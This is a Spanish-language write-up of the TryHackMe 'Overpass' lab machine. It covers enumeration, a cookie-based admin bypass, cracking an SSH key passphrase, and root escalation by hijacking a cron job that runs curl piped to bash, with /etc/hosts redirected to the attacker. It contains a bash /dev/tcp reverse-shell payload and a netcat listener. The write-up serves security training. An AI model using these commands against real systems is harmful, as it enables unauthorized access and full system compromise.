---
title: Overpass Writeup - TryHackMe
date: 2023-06-01
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, OWASP Top 10, Cron, Hash Cracking]
img_path: /assets/img/commons/overpass/
image: overpass.png
---

¡Hola!

En este write-up, exploraremos la máquina [**Overpass**](https://tryhackme.com/room/overpass) de **TryHackMe**, clasificada como de dificultad fácil en la plataforma. Durante este desafío, llevaremos a cabo una enumeración web y explotaremos una vulnerabilidad del OWASP Top 10 para obtener una clave id_rsa, que nos permitirá obtener acceso una vez que hayamos descifrado la contraseña correspondiente. Por último, para la escalada de privilegios, aprovecharemos una tarea cron que se ejecuta cada minuto.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.156.186
PING 10.10.156.186 (10.10.156.186) 56(84) bytes of data.
64 bytes from 10.10.156.186: icmp_seq=1 ttl=61 time=301 ms

--- 10.10.156.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 300.783/300.783/300.783/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.156.186 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 23:24 -05
Nmap scan report for 10.10.156.186
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 5000 10.10.156.186 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 23:26 -05
Nmap scan report for 10.10.156.186
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.86 seconds
```

El reporte nos revela únicamente que en la máquina víctima se están ejecutando los servicios **SSH** (`OpenSSH 7.6p1`) y **HTTP** (`Golang net`).

### HTTP - 80

Comenzamos realizando una enumeración web accediendo a la página que aloja el servidor, y nos encontramos con lo siguiente:

![web](web.png)

Inspeccionamos cada sección de la página, incluyendo su código fuente; sin embargo, no encontramos nada relevante. Por lo tanto, procedimos a realizar fuzzing de directorios utilizando **wfuzz**.

```bash
❯ wfuzz -c -L -t 200 --hc=404,403 --hh=2431 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.156.186/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.156.186/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000069:   200        46 L     131 W      1987 Ch     "downloads"                                                                                                          
000000039:   200        5 L      8 W        183 Ch      "img"                                                                                                                
000000156:   200        38 L     161 W      1749 Ch     "aboutus"                                                                                                            
000000259:   200        39 L     93 W       1525 Ch     "admin"                                                                                                              
000000550:   200        4 L      6 W        79 Ch       "css"                                                                                                                

Total time: 386.3279
Processed Requests: 220560
Filtered Requests: 220555
Requests/sec.: 570.9138
```

El resultado revela la existencia de un panel de administrador que nos permite iniciar sesión.

![admin](admin.png)

Después de probar algunas combinaciones comunes de nombre de usuario y contraseña en vano, examinamos los archivos a los que hace referencia la aplicación web cada vez que intentamos iniciar sesión utilizando la herramienta de desarrolladores de Mozilla (pestaña de red), encontramos un archivo llamado `login.js` que resulta interesante.

![red](red.png)

Al inspeccionar el código JavaScript del archivo `login.js`, se identifica una vulnerabilidad de control de acceso defectuoso (Broken Access Control).

Dentro de este archivo, se encuentra una función de inicio de sesión. Según el código, si el servidor responde con el mensaje "**Incorrect credentials**", no se permite el acceso al panel de administrador para esa persona en particular. Sin embargo, si el servidor no responde con la frase exacta de "**Incorrect credentials**", se establece una cookie con el nombre de "**SessionToken**" y se le concede acceso al panel administrativo.

![login](login.png)

## Explotación

---

Entonces, podemos crear manualmente una cookie llamada "**SessionToken**" y así eludir el acceso al panel de administración.

![cookie](cookie.png)

Una vez recargada la página web, deberíamos obtener acceso. Tras la actualización, la página de administración proporciona una clave SSH privada del usuario **james**.

![admin2](admin2.png)

Copiamos la clave SSH privada y le otorgamos los permisos necesarios.

```bash
❯ chmod 600 id_rsa
```

Al intentar acceder a la máquina a través de SSH utilizando la clave privada, nos solicitaron una contraseña.

```bash
❯ ssh -i id_rsa james@10.10.156.186
Enter passphrase for key 'id_rsa':
```

Para extraer el hash de la clave, podemos utilizar la herramienta **ssh2john**.

```bash
❯ ssh2john id_rsa > hash_id_rsa
```

A continuación, utilizamos **John the Ripper** con las siguientes opciones para descifrarlo:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2023-06-02 00:28) 50.00g/s 668800p/s 668800c/s 668800C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Una vez obtenida la contraseña, accedemos al sistema como usuario **james**.

```bash
❯ ssh -i id_rsa james@10.10.156.186
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jun  2 05:30:08 UTC 2023

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 17%                IP address for eth0: 10.10.156.186
  Swap usage:   0%

47 packages can be updated.
0 updates are security updates.

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ whoami
james
```

A continuación, procedemos a listar los archivos en la ruta principal del usuario **james** y obtenemos la primera bandera.

```bash
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf0005*********************
```

## Escalación de privilegios

---

Una vez que hemos logrado acceder al sistema, nuestro siguiente paso es buscar la forma de escalar privilegios. 

### Abuso de tarea cron

Cuando echamos un vistazo al contenido del archivo `/etc/crontab`, el cual es un archivo de texto que contiene todas las programaciones de las tareas cron que un usuario desea ejecutar regularmente. Descubrimos que hay un cronjob que se ejecuta cada minuto.

```bash
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

La particularidad de que el cronjob se ejecute como root lo convierte en un objetivo interesante, ya que, si logramos explotarlo, obtendremos privilegios de root.

Proseguimos con la enumeración del sistema y, al ejecutar el siguiente comando, descubrimos algunos archivos con permisos de escritura. Entre ellos, notamos que el archivo `/etc/hosts` llama la atención debido a que posee permisos de escritura, lo cual es inusual para un usuario común (**james**).

```bash
james@overpass-prod:~$ find / -writable 2>/dev/null | grep -v -i -E 'proc|run|sys|dev'
/var/crash
/var/lock
/var/tmp
/etc/hosts
/tmp

[...]
```

Echamos un vistazo al contenido del archivo `/etc/hosts` para revisar los mapeos de nombres de host a direcciones IP.

```bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Dentro del archivo, encontramos que el nombre de host `overpass.thm` está apuntando hacia **localhost** (`127.0.0.1`).

Dado que tenemos control sobre el archivo `/etc/hosts` y el cronjob utiliza el nombre de host `overpass.thm` en el comando curl, podemos falsificar el nombre de host para que apunte a nuestra dirección IP atacante. Esto implica que cuando se ejecute el cronjob, se establecerá una conexión con nuestra dirección IP.

Para aprovechar esta oportunidad, debemos hacer es crear un servidor web en nuestra máquina atacante para que la máquina víctima se conecte a él.

Al examinar más detenidamente el cronjob, también notamos que debemos replicar todos los directorios (`/downloads/src/buildscript.sh`) en nuestro servidor web tal como se indica en el comando cronjob. De lo contrario, cada vez que se ejecute el comando curl, obtendremos un error "**404 NOT FOUND**".

Crearemos un archivo llamado `buildscript.sh` que generará una reverse shell hacia nuestra máquina atacante. Luego, lo ubicaremos en la ruta `/downloads/src/` para replicar la estructura mencionada en el cronjob.

```bash
❯ cat buildscript.sh
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: buildscript.sh
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ bash -i >& /dev/tcp/10.2.11.100/443 0>&1
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Para replicar la estructura de directorios mencionada en el cronjob, debemos asegurarnos de que los directorios estén configurados correctamente en nuestro servidor web. La estructura de directorios sería la siguiente:

```bash
./downloads/src/buildscript.sh
```

Para falsificar el nombre de host `overpass.thm` y hacer que apunte a nuestra dirección IP atacante, debemos editar el archivo `/etc/hosts` y reemplazar la línea que contiene `127.0.0.1` con nuestra dirección IP.

```bash
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.2.11.100 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Posteriormente, procedimos a crear un servidor web simple utilizando Python.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Nos ponemos a la escucha en el puerto especificado en la reverse shell y quedamos a la espera de que el cronjob se ejecute, con el objetivo de obtener acceso como usuario root.

```bash
❯ sudo nc -lvnp 443
[sudo] contraseña para juanr: 
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.156.186] 60872
bash: cannot set terminal process group (3558): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# whoami
whoami
root
```

Pasados algunos segundos, logramos obtener acceso al servidor, lo que nos permite acceder al directorio `/root` y leer la última flag de la máquina.

```bash
root@overpass-prod:~# cd /root
cd /root
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359**********************
```

!Happy Hacking!

